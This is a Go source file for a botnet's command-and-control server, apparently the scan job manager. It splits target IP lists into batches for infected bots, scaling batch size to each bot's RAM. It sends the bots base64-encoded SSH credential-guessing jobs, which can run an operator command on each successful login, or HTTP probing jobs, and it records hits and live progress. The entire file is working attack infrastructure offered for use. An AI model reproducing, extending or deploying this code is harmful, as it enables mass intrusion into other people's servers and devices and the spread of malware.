package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"sync"
	"time"
)

// ============================================================================
// SCAN JOB MANAGER — Work-stealing queue with per-target live state
//
// Flow:
// 1. Operator creates a scan job (SSH or HTTP) with target list + config
// 2. CNC holds the target queue and assigns batches to bots on demand
// 3. Bots poll /api/scan-job/poll to get their next batch of targets
// 4. Bots report results per-target: hit/miss/error
// 5. CNC updates per-target status and broadcasts progress via SSE
// 6. UI shows live progress bar + per-target status table
// ============================================================================

// Target status constants
const (
	TargetPending  = "pending"
	TargetAssigned = "assigned"
	TargetHit      = "hit"
	TargetMiss     = "miss"
	TargetError    = "error"
)

// ScanTarget tracks a single target's state
type ScanTarget struct {
	IP        string    `json:"ip"`
	Status    string    `json:"status"`
	AssignedTo string   `json:"assignedTo,omitempty"`
	Result    string    `json:"result,omitempty"`
	UpdatedAt time.Time `json:"updatedAt"`
	// Loader mode: per-target credentials
	Port      int       `json:"port,omitempty"`
	User      string    `json:"user,omitempty"`
	Pass      string    `json:"pass,omitempty"`
}

// ScanJob holds a complete scan job with all targets and config
type ScanJob struct {
	ID        string            `json:"id"`
	Type      string            `json:"type"` // "ssh" or "http"
	Config    map[string]string `json:"config"`
	Targets   []ScanTarget      `json:"targets"`
	CreatedAt time.Time         `json:"createdAt"`
	Status    string            `json:"status"` // "running", "paused", "done"
	BatchSize int               `json:"batchSize"`

	// Counters (computed from targets)
	Total    int `json:"total"`
	Pending  int `json:"pending"`
	Assigned int `json:"assigned"`
	Hits     int `json:"hits"`
	Misses   int `json:"misses"`
	Errors   int `json:"errors"`

	// Queue cursor — next unassigned target index
	cursor int
}

// BotScanStat tracks per-bot scanning performance for the active job
type BotScanStat struct {
	BotID     string    `json:"botID"`
	Assigned  int       `json:"assigned"`
	Hits      int       `json:"hits"`
	Misses    int       `json:"misses"`
	Errors    int       `json:"errors"`
	StartedAt time.Time `json:"startedAt"`
}

var (
	activeJob     *ScanJob
	activeJobLock sync.Mutex
	jobsFile      string
	botScanStats  = make(map[string]*BotScanStat)
)

func init() {
	// Migrate old scan_jobs.json into db/
	if _, err := os.Stat("scan_jobs.json"); err == nil {
		if _, err2 := os.Stat("db/scan_jobs.json"); err2 != nil {
			os.Rename("scan_jobs.json", "db/scan_jobs.json")
		}
	}
	jobsFile = "db/scan_jobs.json"
}


// CreateScanJob initializes a new scan job
func CreateScanJob(jobType string, targets []string, config map[string]string, batchSize int) *ScanJob {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()

	if batchSize <= 0 {
		batchSize = 25
	}

	job := &ScanJob{
		ID:        fmt.Sprintf("%d", time.Now().UnixNano()),
		Type:      jobType,
		Config:    config,
		CreatedAt: time.Now(),
		Status:    "running",
		BatchSize: batchSize,
		Total:     len(targets),
		Pending:   len(targets),
		cursor:    0,
	}

	job.Targets = make([]ScanTarget, len(targets))
	for i, t := range targets {
		job.Targets[i] = ScanTarget{
			IP:        t,
			Status:    TargetPending,
			UpdatedAt: time.Now(),
		}
	}

	activeJob = job
	botScanStats = make(map[string]*BotScanStat) // reset per-bot stats
	saveScanJob()

	// Broadcast job created
	broadcastJobProgress("", "")

	return job
}

// batchSizeForRAM scales the batch size based on bot RAM.
// Low RAM (<256MB): half batch. Normal (256-1024): base batch. High (>1024): 2x. Very high (>4096): 4x.
func batchSizeForRAM(baseBatch int, ramMB int64) int {
	if ramMB <= 0 {
		return baseBatch
	}
	if ramMB < 256 {
		sz := baseBatch / 2
		if sz < 5 {
			sz = 5
		}
		return sz
	}
	if ramMB > 4096 {
		return baseBatch * 4
	}
	if ramMB > 1024 {
		return baseBatch * 2
	}
	return baseBatch
}

// UpdateBotScanProgress broadcasts scanner progress from a bot (e.g., "150/500").
func UpdateBotScanProgress(botID, progress string) {
	PushActivity("scan", fmt.Sprintf("Bot %s progress: %s", botID, progress))
}

// FlushBotResults marks all targets still assigned to a bot as misses.
// Called when a bot finishes its batch (done:) or when it polls for new work.
// This is how the stats card gets bulk-updated at batch boundaries.
func FlushBotResults(botID string) int {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()

	if activeJob == nil {
		return 0
	}

	flushed := 0
	for i := range activeJob.Targets {
		t := &activeJob.Targets[i]
		if t.Status == TargetAssigned && t.AssignedTo == botID {
			t.Status = TargetMiss
			t.Result = "no hit"
			t.UpdatedAt = time.Now()
			activeJob.Assigned--
			activeJob.Misses++
			flushed++
		}
	}

	// Clear bot's scanner status (batch done)
	go func(bid string) {
		botConnsLock.RLock()
		if bc, ok := botConnections[bid]; ok {
			bc.scanningType = ""
			bc.scanBatchRemaining = 0
		}
		botConnsLock.RUnlock()
	}(botID)

	if flushed > 0 {
		// Check if job is done
		if activeJob.Pending == 0 && activeJob.Assigned == 0 {
			activeJob.Status = "done"
			logMsg("[SCAN-JOB] Complete: %d targets — %d hits, %d miss, %d errors",
				activeJob.Total, activeJob.Hits, activeJob.Misses, activeJob.Errors)
			PushActivity("scan", fmt.Sprintf("Scan job complete: %d/%d hits (%d errors)",
				activeJob.Hits, activeJob.Total, activeJob.Errors))
		}
		saveScanJob()
		broadcastJobProgress("", "")
	}

	return flushed
}

// PollTargets assigns a batch of targets to a bot. Batch size scales with RAM.
func PollTargets(botID string, ramMB int64) ([]string, map[string]string, string) {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()

	if activeJob == nil || activeJob.Status != "running" {
		return nil, nil, ""
	}

	// Flush: mark any targets still assigned to this bot from previous batch as misses.
	// This is the natural batch boundary — bot finished its work and came back for more.
	for i := range activeJob.Targets {
		t := &activeJob.Targets[i]
		if t.Status == TargetAssigned && t.AssignedTo == botID {
			t.Status = TargetMiss
			t.Result = "no hit"
			t.UpdatedAt = time.Now()
			activeJob.Assigned--
			activeJob.Misses++
		}
	}

	batchSize := batchSizeForRAM(activeJob.BatchSize, ramMB)
	logMsg("[SCAN-JOB] PollTargets: bot=%s ram=%dMB batch=%d", botID, ramMB, batchSize)

	var batch []string
	for i := 0; i < batchSize && activeJob.cursor < len(activeJob.Targets); i++ {
		t := &activeJob.Targets[activeJob.cursor]
		if t.Status == TargetPending {
			t.Status = TargetAssigned
			t.AssignedTo = botID
			t.UpdatedAt = time.Now()
			batch = append(batch, t.IP)
			activeJob.Pending--
			activeJob.Assigned++
		}
		activeJob.cursor++
	}

	if len(batch) == 0 {
		// Reclaim abandoned targets (bot died >5min ago)
		for i := range activeJob.Targets {
			t := &activeJob.Targets[i]
			if t.Status == TargetAssigned && time.Since(t.UpdatedAt) > 5*time.Minute {
				t.Status = TargetAssigned
				t.AssignedTo = botID
				t.UpdatedAt = time.Now()
				batch = append(batch, t.IP)
				if len(batch) >= batchSize {
					break
				}
			}
		}
	}

	// Track per-bot stats
	if len(batch) > 0 {
		if _, ok := botScanStats[botID]; !ok {
			botScanStats[botID] = &BotScanStat{BotID: botID, StartedAt: time.Now()}
		}
		botScanStats[botID].Assigned += len(batch)
	}

	return batch, activeJob.Config, activeJob.Type
}

// GetBotScanStats returns per-bot scanning stats for the active job
func GetBotScanStats() []BotScanStat {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()
	var stats []BotScanStat
	for _, s := range botScanStats {
		elapsed := time.Since(s.StartedAt).Seconds()
		if elapsed < 1 { elapsed = 1 }
		stats = append(stats, *s)
	}
	return stats
}

// ReportTarget updates a target's status from a bot report
func ReportTarget(ip, status, result string) {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()

	if activeJob == nil {
		return
	}

	var assignedBot string
	for i := range activeJob.Targets {
		t := &activeJob.Targets[i]
		if t.IP == ip {
			oldStatus := t.Status
			assignedBot = t.AssignedTo
			t.Status = status
			t.Result = result
			t.UpdatedAt = time.Now()

			// Update counters
			if oldStatus == TargetAssigned {
				activeJob.Assigned--
			} else if oldStatus == TargetPending {
				activeJob.Pending--
			}
			switch status {
			case TargetHit:
				activeJob.Hits++
			case TargetMiss:
				activeJob.Misses++
			case TargetError:
				activeJob.Errors++
			}

			// Update per-bot stats
			if assignedBot != "" {
				if s, ok := botScanStats[assignedBot]; ok {
					switch status {
					case TargetHit:
						s.Hits++
					case TargetMiss:
						s.Misses++
					case TargetError:
						s.Errors++
					}
				}
			}

			break
		}
	}

	// Update bot scanner stats (decrement remaining, increment hits)
	if assignedBot != "" {
		go func(botID, st string) {
			botConnsLock.RLock()
			if bc, ok := botConnections[botID]; ok {
				if bc.scanBatchRemaining > 0 {
					bc.scanBatchRemaining--
				}
				if st == TargetHit {
					bc.totalHits++
				}
			}
			botConnsLock.RUnlock()
		}(assignedBot, status)
	}

	// Check if job is done — all targets have been tried
	if activeJob.Pending == 0 && activeJob.Assigned == 0 {
		activeJob.Status = "done"

		// Auto-cleanup: stop scanners on all bots
		go func() {
			sendToBots("!stopssh")
			sendToBots("!stophttp")
		}()

		logMsg("[SCAN-JOB] Complete: %d targets — %d hits, %d miss, %d errors",
			activeJob.Total, activeJob.Hits, activeJob.Misses, activeJob.Errors)
		PushActivity("scan", fmt.Sprintf("Scan job complete: %d/%d hits (%d errors)",
			activeJob.Hits, activeJob.Total, activeJob.Errors))
	}

	saveScanJob()

	// Pass hit details to broadcast so frontend gets live feed + beep
	hitIP, hitResult := "", ""
	if status == TargetHit {
		hitIP = ip
		hitResult = result
	}
	broadcastJobProgress(hitIP, hitResult)
}

// GetJobProgress returns summary stats for the active job
func GetJobProgress() map[string]interface{} {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()

	if activeJob == nil {
		return map[string]interface{}{"active": false}
	}

	return map[string]interface{}{
		"active":    true,
		"id":        activeJob.ID,
		"type":      activeJob.Type,
		"status":    activeJob.Status,
		"total":     activeJob.Total,
		"pending":   activeJob.Pending,
		"assigned":  activeJob.Assigned,
		"hits":      activeJob.Hits,
		"misses":    activeJob.Misses,
		"errors":    activeJob.Errors,
		"batchSize": activeJob.BatchSize,
		"createdAt": activeJob.CreatedAt.Format(time.RFC3339),
	}
}

// GetJobTargets returns all targets with their current status
func GetJobTargets(filter string, limit, offset int) ([]ScanTarget, int) {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()

	if activeJob == nil {
		return nil, 0
	}

	if limit <= 0 {
		limit = 100
	}

	var filtered []ScanTarget
	for _, t := range activeJob.Targets {
		if filter == "" || t.Status == filter {
			filtered = append(filtered, t)
		}
	}

	total := len(filtered)
	if offset >= total {
		return nil, total
	}
	end := offset + limit
	if end > total {
		end = total
	}
	return filtered[offset:end], total
}

// GetJobHits returns only hit targets
func GetJobHits() []ScanTarget {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()

	if activeJob == nil {
		return nil
	}

	var hits []ScanTarget
	for _, t := range activeJob.Targets {
		if t.Status == TargetHit {
			hits = append(hits, t)
		}
	}
	return hits
}

// StopJob pauses the active job — lets bots finish current batch, stops new assignments.
// Assigned targets stay assigned so incoming results are still recorded.
// After 30s grace period, any still-assigned targets revert to pending.
func StopJob() {
	activeJobLock.Lock()
	if activeJob == nil {
		activeJobLock.Unlock()
		return
	}
	activeJob.Status = "paused"
	saveScanJob()
	assigned := activeJob.Assigned
	activeJobLock.Unlock()

	broadcastJobProgress("", "")
	logMsg("[SCAN-JOB] Paused — %d targets still in-flight, waiting for results", assigned)

	// Grace period: let bots flush results for 30s, then reclaim stragglers
	go func() {
		time.Sleep(30 * time.Second)
		activeJobLock.Lock()
		defer activeJobLock.Unlock()
		if activeJob == nil || activeJob.Status != "paused" {
			return
		}
		reclaimed := 0
		for i := range activeJob.Targets {
			if activeJob.Targets[i].Status == TargetAssigned {
				activeJob.Targets[i].Status = TargetPending
				activeJob.Targets[i].AssignedTo = ""
				activeJob.Pending++
				activeJob.Assigned--
				reclaimed++
			}
		}
		if reclaimed > 0 {
			logMsg("[SCAN-JOB] Reclaimed %d timed-out targets after pause", reclaimed)
			saveScanJob()
			broadcastJobProgress("", "")
		}
	}()
}

// ForceStopJob immediately kills bot scanners and reclaims all assigned targets.
func ForceStopJob() {
	activeJobLock.Lock()
	if activeJob == nil {
		activeJobLock.Unlock()
		return
	}
	activeJob.Status = "paused"
	for i := range activeJob.Targets {
		if activeJob.Targets[i].Status == TargetAssigned {
			activeJob.Targets[i].Status = TargetPending
			activeJob.Targets[i].AssignedTo = ""
			activeJob.Pending++
			activeJob.Assigned--
		}
	}
	saveScanJob()
	activeJobLock.Unlock()

	broadcastJobProgress("", "")

	// Kill scanners on all bots
	sendToBots("!stopssh")
	sendToBots("!stophttp")
}

// ResumeJob resumes a paused job — re-assigns pending targets to connected bots
func ResumeJob() {
	activeJobLock.Lock()
	if activeJob == nil || activeJob.Status != "paused" {
		activeJobLock.Unlock()
		return
	}
	activeJob.Status = "running"

	// Advance cursor to first pending target (skip already completed)
	activeJob.cursor = 0
	for i, t := range activeJob.Targets {
		if t.Status == TargetPending {
			activeJob.cursor = i
			break
		}
	}

	saveScanJob()
	activeJobLock.Unlock()

	broadcastJobProgress("", "")

	// Assign batches to all connected bots
	botConnsLock.RLock()
	for _, bc := range botConnections {
		if bc.authenticated {
			go assignNextBatch(bc.botID, bc)
		}
	}
	botConnsLock.RUnlock()

	logMsg("[SCAN-JOB] Resumed: %d targets remaining", activeJob.Pending)
}

// ClearJob removes the active job
func ClearJob() {
	activeJobLock.Lock()
	defer activeJobLock.Unlock()
	activeJob = nil
	os.Remove(jobsFile)
}

func saveScanJob() {
	if activeJob == nil {
		return
	}
	data, err := json.MarshalIndent(activeJob, "", "  ")
	if err != nil {
		return
	}
	tmp := jobsFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		return
	}
	os.Rename(tmp, jobsFile)
}

func loadScanJob() {
	data, err := os.ReadFile(jobsFile)
	if err != nil {
		return
	}
	var job ScanJob
	if json.Unmarshal(data, &job) == nil {
		// Recompute counters
		job.Pending = 0
		job.Assigned = 0
		job.Hits = 0
		job.Misses = 0
		job.Errors = 0
		for _, t := range job.Targets {
			switch t.Status {
			case TargetPending:
				job.Pending++
			case TargetAssigned:
				job.Pending++ // re-assign on restart
			case TargetHit:
				job.Hits++
			case TargetMiss:
				job.Misses++
			case TargetError:
				job.Errors++
			}
		}
		// Reset assigned to pending on restart (bot connections are gone)
		for i := range job.Targets {
			if job.Targets[i].Status == TargetAssigned {
				job.Targets[i].Status = TargetPending
			}
		}
		job.cursor = 0
		for i, t := range job.Targets {
			if t.Status == TargetPending {
				job.cursor = i
				break
			}
		}
		activeJob = &job
		logMsg("[SCAN-JOB] Loaded job %s: %d targets (%d hits, %d pending)", job.ID, job.Total, job.Hits, job.Pending)
	}
}

// assignNextBatch polls the job queue and sends next batch to a bot
func assignNextBatch(botID string, botConn *BotConnection) {
	if botConn == nil || botConn.conn == nil {
		return
	}
	// Only assign scan work to bots with scanner capability
	if !botConn.hasScanner {
		logMsg("[SCAN-JOB] Skipping %s — no scanner capability", botID)
		return
	}

	ramMB := botConn.ram

	batch, config, jobType := PollTargets(botID, ramMB)
	if len(batch) == 0 {
		return
	}

	// Build payload based on job type
	var payload string
	var cmdPrefix string
	switch jobType {
	case "ssh":
		// Build SSH payload: MODE:report\nIPs\n---\ncombos\n===\ncmd
		payload = "MODE:" + config["mode"] + "\n"
		if config["clean"] == "true" {
			payload += "CLEAN:1\n"
		}
		for _, ip := range batch {
			payload += ip + "\n"
		}
		payload += "---\n"
		if combos, ok := config["combos"]; ok {
			payload += combos
		}
		if cmd, ok := config["command"]; ok && cmd != "" {
			payload += "\n===\n" + cmd
		}
		cmdPrefix = "ssh"
	case "http":
		// Build HTTP payload
		if method, ok := config["method"]; ok {
			payload += "METHOD:" + method + "\n"
		}
		if path, ok := config["path"]; ok {
			payload += "PATH:" + path + "\n"
		}
		if port, ok := config["port"]; ok {
			payload += "PORT:" + port + "\n"
		}
		if ua, ok := config["ua"]; ok {
			payload += "UA:" + ua + "\n"
		}
		if expect, ok := config["expect"]; ok {
			payload += "EXPECT:" + expect + "\n"
		}
		// Custom headers from config
		for k, v := range config {
			if len(k) > 7 && k[:7] == "header_" {
				payload += "HEADER:" + v + "\n"
			}
		}
		payload += "---\n"
		for _, ip := range batch {
			payload += ip + "\n"
		}
		if body, ok := config["body"]; ok && body != "" {
			payload += "===\n" + body
		}
		cmdPrefix = "http"
	default:
		return
	}

	// Base64 encode and send
	encoded := base64Encode(payload)
	cmd := "!" + cmdPrefix + " " + encoded
	sendToSingleBot(botID, cmd)

	// Update bot scanner status
	botConnsLock.RLock()
	if bc, ok := botConnections[botID]; ok {
		bc.scanningType = jobType
		bc.scanBatchSize = len(batch)
		bc.scanBatchRemaining = len(batch)
	}
	botConnsLock.RUnlock()

	logMsg("[SCAN-JOB] Assigned %d targets to %s (%s)", len(batch), botID, jobType)
}

// base64Encode encodes a string to base64
func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func broadcastJobProgress(lastHitIP, lastHitResult string) {
	if activeJob == nil {
		return
	}
	progress := map[string]interface{}{
		"total":   activeJob.Total,
		"pending": activeJob.Pending,
		"hits":    activeJob.Hits,
		"misses":  activeJob.Misses,
		"errors":  activeJob.Errors,
		"status":  activeJob.Status,
	}
	if lastHitIP != "" {
		progress["lastHit"] = lastHitIP + " — " + lastHitResult
	}
	if data, err := json.Marshal(progress); err == nil {
		broadcastSSE("scan_progress", string(data))
	}

	// Broadcast individual hit event so the frontend can update live feed + beep
	if lastHitIP != "" {
		hit := map[string]interface{}{
			"ip":     lastHitIP,
			"result": lastHitResult,
		}
		if data, err := json.Marshal(hit); err == nil {
			broadcastSSE("scan_hit", string(data))
		}
	}
}
